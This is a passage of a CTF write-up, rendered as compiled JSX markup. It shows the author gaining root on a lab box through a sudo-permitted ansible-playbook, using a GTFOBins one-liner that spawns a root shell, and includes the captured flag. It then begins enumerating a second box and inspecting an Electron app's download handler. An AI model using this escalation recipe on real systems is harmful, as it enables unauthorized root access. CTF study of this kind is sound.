punctuation\",children:\"\\\\\"}),\":/sbin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\":/bin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),`:/snap/bin\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`User john may run the following commands on beautycare:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),` NOPASSWD: /usr/bin/ansible-playbook\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@beautycare:~$\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"I just searched this binary in gtfobins and grabbed:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"TF\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsxs)(n.span,{className:\"token variable\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$(\"}),\"mktemp\",(0,e.jsx)(n.span,{className:\"token variable\",children:\")\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"echo\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"sudo\"}),\" /usr/bin/ansible-playbook \",(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.a,{href:\"https://gtfobins.github.io/gtfobins/ansible-playbook/\",children:\"https://gtfobins.github.io/gtfobins/ansible-playbook/\"})}),`\n`]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"TF\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsxs)(n.span,{className:\"token variable\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$(\"}),\"mktemp\",(0,e.jsx)(n.span,{className:\"token variable\",children:\")\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"echo\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"TF\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsxs)(n.span,{className:\"token variable\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$(\"}),\"mktemp\",(0,e.jsx)(n.span,{className:\"token variable\",children:\")\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"john@beautycare:~$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"sudo\"}),\" /usr/bin/ansible-playbook \",(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"echo\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"john@beautycare:~$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"sudo\"}),\" /usr/bin/ansible-playbook \",(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"WARNING\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`: provided hosts list is empty, only localhost is available. Note that\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"the implicit localhost does not match \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'all'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"PLAY \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"localhost\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` **************************************************************\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"TASK \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"Gathering Facts\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` *********************************************************\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"ok: \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"localhost\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"TASK \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"shell\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` *******************************************************************\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# id\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"id\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"uid\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"gid\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"groups\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# cat /root/root.txt\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"cat\"}),` /root/root.txt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STF22\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"3f62f62107c411482f5bc8caff1843e2\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And that\\u2019s it \\\\o/\"}),`\n`,(0,e.jsxs)(n.h2,{id:\"electrogrid-fullpwn-2000-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#electrogrid-fullpwn-2000-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Electrogrid (Fullpwn, 2000 Points)\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"enumeration-1\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#enumeration-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Enumeration\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We started with a simple \",(0,e.jsx)(n.code,{children:\"nmap\"}),\" scan with the basic options:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp \\xBB nmap -sC -sV \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.129\"}),`.228.64 -v\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"9000\"}),\"/tcp \",(0,e.jsx)(n.span,{className:\"token function\",children:\"open\"}),`  cslistener?\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),` fingerprint-strings:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LPDString, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     HTTP/1.1 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"400\"}),` Bad Request\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`     Connection: close\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`   FourOhFourRequest:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     HTTP/1.1 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"404\"}),` Not Found\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Type: application/json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"charset\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`utf-8\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Length: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Date: Mon, 05 Dec \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2022\"}),` 09:45:20 GMT\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`     Connection: close\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"message\"'}),(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"404 page not found\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`   GetRequest, HTTPOptions:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     HTTP/1.1 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"404\"}),` Not Found\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Type: application/json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"charset\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`utf-8\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Length: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Date: Mon, 05 Dec \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2022\"}),` 09:45:13 GMT\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`     Connection: close\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"message\"'}),(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"404 page not found\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`   RTSPRequest:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     HTTP/1.1 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"404\"}),` Not Found\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Type: application/json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"charset\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`utf-8\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Length: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Date: Mon, 05 Dec \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2022\"}),` 09:45:14 GMT\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`     Connection: close\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"_    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"message\"'}),(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"404 page not found\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We just have port 9000 open in this case, which seems like an API. Nothing interesting here for now!\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"We are provided with \",(0,e.jsx)(n.code,{children:\"UserLandCityPC-1.0.0.AppImage\"}),\". We can start by unpacking/unarchiving it using \",(0,e.jsx)(n.code,{children:\"7z\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/userland \\xBB 7z x UserLandCityPC-1.0.0.AppImage\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"SNIP\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Archives with Warnings: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Warnings: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Folders: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"19\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Files: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"89\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Size:       \",(0,e.jsx)(n.span,{className:\"token number\",children:\"243843126\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Compressed: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"95369065\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland \\xBB \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ls\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`AppRun                  chrome_crashpad_handler  libEGL.so     libvk_swiftshader.so  LICENSES.chromium.html  resources.pak      UserLandCityPC-1.0.0.AppImage  usr\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`chrome_100_percent.pak  chrome-sandbox           libffmpeg.so  libvulkan.so.1        locales                 snapshot_blob.bin  userlandcitypc.desktop         v8_context_snapshot.bin\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`chrome_200_percent.pak  icudtl.dat               libGLESv2.so  LICENSE.electron.txt  resources               userlandcitypc     userlandcitypc.png             vk_swiftshader_icd.json\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Checking the \",(0,e.jsx)(n.code,{children:\"resources\"}),\" folder we can find an \",(0,e.jsx)(n.code,{children:\"asar\"}),\" file:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland \\xBB \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"cd\"}),` resources\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland/resources \\xBB \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ls\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`app.asar\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"An \",(0,e.jsx)(n.code,{children:\"asar\"}),\" file is a package file used by the Electron framework to store application code and other assets. So at this point, we\\u2019ll know that we\\u2019ll be dealing with an electron application.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"I\\u2019ll use the following command to extract its content:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsx)(n.code,{className:\"language-bash code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`npx asar extract app.asar extract\n`})})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland/resources \\xBB \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"cd\"}),` extract\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland/resources/extract \\xBB \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ls\"}),` -la\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"total \",(0,e.jsx)(n.span,{className:\"token number\",children:\"40\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),\" 04:58 \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\".\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwx------  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),\" 04:58 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"713\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 index.html\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1488\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 index.js\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwxr-xr-x \",(0,e.jsx)(n.span,{className:\"token number\",children:\"20\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 node_modules\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"377\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 package.json\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"783\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 preload.js\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 src\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 static\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1029\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 webpack.common.js\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Checking the \",(0,e.jsx)(n.code,{children:\"index.js\"}),\" file, we can notice an interesting function that is being called:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"ipcMain\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"on\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'handle-links'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsxs)(n.span,{className:\"token parameter\",children:[\"event\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" task\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" url\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=>\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"task \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"===\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'download'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"const\"}),\" downloadPath \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/opt/userland/'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"const\"}),\" filename \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"split\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"pop\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"const\"}),\" filepath \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsxs)(n.span,{className:\"token template-string\",children:[(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"downloadPath\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"filename\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    fs\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"access\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"filepath\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" fs\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"F_OK\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"async\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"err\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=>\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      